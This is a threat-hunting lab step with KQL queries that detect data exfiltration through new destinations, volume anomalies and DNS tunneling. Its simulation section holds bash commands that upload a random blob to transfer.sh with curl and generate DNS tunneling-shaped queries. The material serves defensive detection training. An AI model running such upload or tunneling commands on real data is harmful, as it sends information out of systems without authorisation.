<div align="center">

# 🏹 Step 47 · Hunt: exfiltration

### *Rare destinations, volume anomalies, and DNS tunneling*

[![Phase](https://img.shields.io/badge/Phase-Threat hunting-D29922?style=flat-square)](../README.md)
[![Time](https://img.shields.io/badge/Time-~45 min-0078D4?style=flat-square)](#)
[![Cost](https://img.shields.io/badge/Cost-%240-107C10?style=flat-square)](#)

</div>

---

## 🎯 Goal

Run three exfiltration hunts against network telemetry (`DeviceNetworkEvents`, `CommonSecurityLog`,
or VNet flow logs / `DnsEvents`), baseline them, simulate, and bookmark.

## 🧠 Why this step

Exfil is the last stage and the last chance to catch it. The tells: a host talking to somewhere it
never has, an outbound volume far above its own norm, or DNS queries that carry data.

## ✅ Prerequisites

- One of: `DeviceNetworkEvents` (step 10), CEF firewall logs (step 12), or NSG/VNet flow logs +
  `DnsEvents`
- A lab host you can generate traffic from

## 🧭 The three hunts

### 1️⃣ New external destination for a host — T1041

```kusto
let hist = 21d; let recent = 1d;
let baseline =
    DeviceNetworkEvents
    | where TimeGenerated between (ago(hist) .. ago(recent))
    | where RemoteIPType == "Public"
    | summarize by DeviceName, RemoteUrl = coalesce(RemoteUrl, tostring(RemoteIP));
DeviceNetworkEvents
| where TimeGenerated > ago(recent) and RemoteIPType == "Public"
| where ActionType == "ConnectionSuccess"
| summarize Conns = count(), Bytes = sum(coalesce(toint(column_ifexists("BytesSent", 0)), 0))
    by DeviceName, RemoteUrl = coalesce(RemoteUrl, tostring(RemoteIP)), RemotePort
| join kind=leftanti baseline on DeviceName, RemoteUrl
| where Conns >= 3
| sort by Bytes desc
```

### 2️⃣ Outbound volume anomaly vs the host's own 14-day norm — T1030

```kusto
let perHostHourly =
    CommonSecurityLog
    | where TimeGenerated > ago(14d) and DeviceAction != "deny"
    | where isnotempty(SentBytes)
    | summarize Sent = sum(todouble(SentBytes)) by SourceIP, bin(TimeGenerated, 1h);
perHostHourly
| summarize Avg = avg(Sent), Std = stdev(Sent) by SourceIP
| join kind=inner (
    perHostHourly | where TimeGenerated > ago(1d)
  ) on SourceIP
| extend Z = (Sent - Avg) / (Std + 1)
| where Z > 4 and Sent > 50000000        // 4 sigma AND > ~50 MB in an hour
| project TimeGenerated, SourceIP, Sent, Avg, Z
| sort by Z desc
```

### 3️⃣ DNS tunneling — T1071.004 / T1048

```kusto
DnsEvents
| where TimeGenerated > ago(7d) and QueryType in ("A","AAAA","TXT","NULL","CNAME")
| extend Sub = tostring(split(Name, ".")[0])
| extend Domain = strcat(tostring(split(Name, ".")[-2]), ".", tostring(split(Name, ".")[-1]))
| summarize
    Queries = count(),
    DistinctSubdomains = dcount(Name),
    AvgSubLen = avg(strlen(Sub)),
    MaxSubLen = max(strlen(Sub)),
    TxtQueries = countif(QueryType == "TXT")
    by ClientIP, Domain
| where DistinctSubdomains > 200 and AvgSubLen > 25      // many long random labels under one domain
| sort by DistinctSubdomains desc
```

## 🖱️ Do it — simulate (lab host, benign)

```bash
# 1. new destination + 2. volume: push ~100 MB to a paste/file service you control
head -c 100M /dev/urandom | base64 > /tmp/blob.txt
curl -F "file=@/tmp/blob.txt" https://transfer.sh/blob.txt   # or your own endpoint

# 3. DNS tunneling shape (no real tunnel — just the query pattern)
for i in $(seq 1 300); do
  dig +short "$(head -c 30 /dev/urandom | base64 | tr -d '=+/' | head -c 30).lab-exfil-test.example" TXT >/dev/null
done
```

## 🧪 Validate

**You should see** the transfer.sh host as a new destination in hunt 1, an hour with a high Z-score
in hunt 2, and `lab-exfil-test.example` with 200+ long random subdomains in hunt 3. Baseline runs
(before simulation) return nothing on these. Bookmark each; note that hunt 3's pattern is a strong
detection candidate (step 49).

## 🚩 Common mistakes

| 🚩 Mistake | Why it bites |
|---|---|
| Global volume threshold instead of per-host-Z | CDN caches and backup hosts always trip a flat threshold |
| Not excluding known cloud/CDN ranges | New-destination hunt drowns in Azure/AWS/Akamai IPs |
| DNS hunt without the length + count combo | Normal CDNs have many subdomains; tunnels add *length* + entropy |
| Ignoring TXT/NULL query types | Classic tunneling carries payload in TXT answers |

## 🗒️ Log your run

`LOG.md` + `HUNT-EXFIL-00X.md` with baselines and hits. Flag the DNS one for step 49.

## 📚 Microsoft Learn

- [Hunt for data exfiltration](https://learn.microsoft.com/en-us/azure/sentinel/hunting)
- [series_decompose_anomalies() / anomaly detection in KQL](https://learn.microsoft.com/en-us/kusto/query/series-decompose-anomalies-function)
- [DnsEvents schema](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/dnsevents)

---

<div align="center">
<sub>

[⬅ Prev: 46 · Hunt: lateral movement](../46-hunt-lateral-movement/README.md) &nbsp;·&nbsp; [🦅 All steps](../README.md) &nbsp;·&nbsp; [Next: 48 · Hunt: cloud control plane ➡](../48-hunt-cloud-control-plane/README.md)

</sub>
</div>
